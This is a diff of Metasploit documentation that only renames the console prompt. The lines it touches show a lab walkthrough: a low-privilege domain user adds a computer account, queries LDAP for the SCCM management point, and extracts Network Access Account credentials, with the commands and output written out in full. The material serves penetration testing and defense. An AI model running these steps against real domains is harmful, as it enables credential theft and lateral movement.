@@ -59,7 +59,7 @@ In the following example the user `ssccm.lab\eve` is a low-privilege user.
 ### Creating computer account
 
 ```
-msf6 auxiliary(admin/dcerpc/samr_account) > run rhost=192.168.33.10 domain=sccm.lab username=eve password=iloveyou
+msf auxiliary(admin/dcerpc/samr_account) > run rhost=192.168.33.10 domain=sccm.lab username=eve password=iloveyou
 [*] Running module against 192.168.33.10
 
 [*] 192.168.33.10:445 - Adding computer
@@ -73,7 +73,7 @@ msf6 auxiliary(admin/dcerpc/samr_account) > run rhost=192.168.33.10 domain=sccm.
 Using the credentials just obtained with the `samr_account` module.
 
 ```
-msf6 auxiliary(admin/sccm/get_naa_credentials) > options
+msf auxiliary(admin/sccm/get_naa_credentials) > options
 
 Module options (auxiliary/admin/sccm/get_naa_credentials):
 
@@ -106,7 +106,7 @@ Module options (auxiliary/admin/sccm/get_naa_credentials):
 
 
 View the full module info with the info, or info -d command.
-msf6 auxiliary(admin/sccm/get_naa_credentials) > run rhost=192.168.33.10 username=eve domain=sccm.lab password=iloveyou computer_user=DESKTOP-2KVDWNZ3$ computer_pass=pJTrvFyDHiHnqtlqTTNYe2HPVpO3Yekj
+msf auxiliary(admin/sccm/get_naa_credentials) > run rhost=192.168.33.10 username=eve domain=sccm.lab password=iloveyou computer_user=DESKTOP-2KVDWNZ3$ computer_pass=pJTrvFyDHiHnqtlqTTNYe2HPVpO3Yekj
 [*] Running module against 192.168.33.10
 
 [*] Discovering base DN automatically
@@ -122,7 +122,7 @@ msf6 auxiliary(admin/sccm/get_naa_credentials) > run rhost=192.168.33.10 usernam
 ### Manual discovery
 
 ```
-msf6 auxiliary(gather/ldap_query) > run rhost=192.168.33.10 username=eve domain=sccm.lab password=iloveyou
+msf auxiliary(gather/ldap_query) > run rhost=192.168.33.10 username=eve domain=sccm.lab password=iloveyou
 [*] Running module against 192.168.33.10
 
 [*] 192.168.33.10:389 Discovered base DN: DC=sccm,DC=lab
@@ -138,9 +138,9 @@ CN=SMS-MP-P01-MECM.SCCM.LAB,CN=System Management,CN=System,DC=sccm,DC=lab
 [*] Query returned 1 result.
 [*] Auxiliary module execution completed
 
-msf6 auxiliary(gather/ldap_query) > use auxiliary/admin/sccm/get_naa_credentials
+msf auxiliary(gather/ldap_query) > use auxiliary/admin/sccm/get_naa_credentials
 
-msf6 auxiliary(admin/sccm/get_naa_credentials) > run computer_user=DESKTOP-2KVDWNZ3$ computer_pass=pJTrvFyDHiHnqtlqTTNYe2HPVpO3Yekj management_point=MECM.sccm.lab site_code=P01
+msf auxiliary(admin/sccm/get_naa_credentials) > run computer_user=DESKTOP-2KVDWNZ3$ computer_pass=pJTrvFyDHiHnqtlqTTNYe2HPVpO3Yekj management_point=MECM.sccm.lab site_code=P01
 
 [*] Got SMS ID: BD0DC478-A71A-4348-BD14-B7E91335738E
 [*] Waiting 5 seconds for SCCM DB to update...
